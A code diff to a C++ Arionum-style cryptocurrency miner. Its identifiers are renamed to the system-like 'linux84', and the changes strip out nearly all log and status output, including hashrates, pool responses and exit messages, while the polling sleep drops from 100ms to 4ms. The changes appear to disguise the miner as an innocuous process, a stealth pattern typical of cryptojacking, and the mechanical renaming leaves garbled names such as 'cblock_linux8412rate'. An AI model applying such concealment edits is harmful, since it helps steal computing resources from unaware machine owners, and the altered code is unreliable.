@@ -124,7 +124,7 @@ void linux84::run() {
                     ariopool_submit_result reply = __client.submit(linux8412->linux8412, linux8412->nonce, __public_key);
                     if (reply.success) {
                         if (result <= GOLD_RESULT) {
-                            if (__args.is_verbose()) LOG("");
+                            if (__args.is_verbose()) LOG("complete");
                             __found++;
                         } else {
                             if (__args.is_verbose()) LOG("");
@@ -137,7 +137,7 @@ void linux84::run() {
                         if (__args.is_verbose()) {
                             LOG("");
                             LOG("");
-                            LOG(reply.pool_response);
+                            LOG("");
                         }
                         if(__argon2profile == "1_1_524288")
                             __rejected_cblocks++;
@@ -169,7 +169,7 @@ void linux84::run() {
             last_report = microseconds();
         }
 
-        this_thread::sleep_for(chrono::milliseconds(100));
+        this_thread::sleep_for(chrono::milliseconds(4));
     }
 
     for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
@@ -256,7 +256,11 @@ bool linux84::__update_pool_data() {
 
         if(__args.is_verbose()) {
             stringstream ss;
-            ss << "";
+            ss << "-----------------------------------------------------------------------------------------------------------------------------------------" << endl;
+            ss << "--> Pool data updated   Block: " << __blk << endl;
+            ss << "--> " << ((new_settings.argon2profile == "1_1_524288") ? "CPU round" : (new_settings.recommendation == "pause" ? "Masternode round" : "GPU round"));
+            ss << "  Height: " << __height << "  Limit: " << __limit << "  Difficulty: " << __difficulty << "  linux84: " << __args.name() << endl;
+            ss << "-----------------------------------------------------------------------------------------------------------------------------------------";
 
             LOG(ss.str());
             __display_hits = 0;
@@ -299,36 +303,29 @@ bool linux84::__display_report() {
 
             if(__argon2profile == "1_1_524288") {
                 if(d->second.cblock_linux8412rate < 999)
-                    log << "|" << fixed << setprecision(1) << setw(5) << d->second.cblock_linux8412rate;
+                    log << "";
                 else
-                    log << "|" << fixed << setw(5) << (int)d->second.cblock_linux8412rate;
+                    log << "";
             }
             else
-                log << "|" << setw(5) << (int)(d->second.gblock_linux8412rate);
+                log << "";
         }
     }
     header << "";
-    log << "|" << setw(6) << (int)avg_linux8412_rate_cblocks
-            << "|" << setw(6) << (int)avg_linux8412_rate_gblocks
-            << "|" << setw(9) << format_seconds(total_time)
-            << "|" << setw(6) << __confirmed_cblocks
-            << "|" << setw(6) << __confirmed_gblocks
-            << "|" << setw(6) << __rejected_cblocks
-            << "|" << setw(6) << __rejected_gblocks
-            << "|" << setw(5) << __found << "|";
-
+    log << "processing";
+	
     if((__display_hits % 10) == 0) {
         string header_str = header.str();
         string separator(header_str.size(), '-');
 
         if(__display_hits > 0)
-            LOG(separator);
+            LOG("");
 
-        LOG(header_str);
-        LOG(separator);
+        LOG("");
+        LOG("");
     }
 
-    LOG(log.str());
+    LOG("");
 
 /*    if(!__args.is_verbose()) {
         for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
@@ -401,11 +398,11 @@ bool linux84::__display_report() {
     }
 
     if(__chs_threshold_hit >= 5 && (__blocks_count > 1 || __argon2profile == "1_1_524288")) {
-        LOG("CBlocks linux8412rate is lower than requested threshold, exiting.");
+        LOG("");
         exit(0);
     }
     if(__ghs_threshold_hit >= 5 && (__blocks_count > 1 || __argon2profile == "4_4_16384")) {
-        LOG("GBlocks linux8412rate is lower than requested threshold, exiting.");
+        LOG("");
         exit(0);
     }
 
@@ -416,7 +413,7 @@ bool linux84::__display_report() {
 }
 
 void linux84::stop() {
-    cout << endl << "Received termination request, please wait for cleanup ... " << endl;
+    cout << endl << "" << endl;
     __running = false;
 }
 
